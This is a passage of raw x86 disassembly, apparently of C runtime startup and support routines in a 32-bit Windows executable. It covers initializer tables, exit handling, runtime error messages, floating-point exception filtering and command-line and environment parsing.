  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
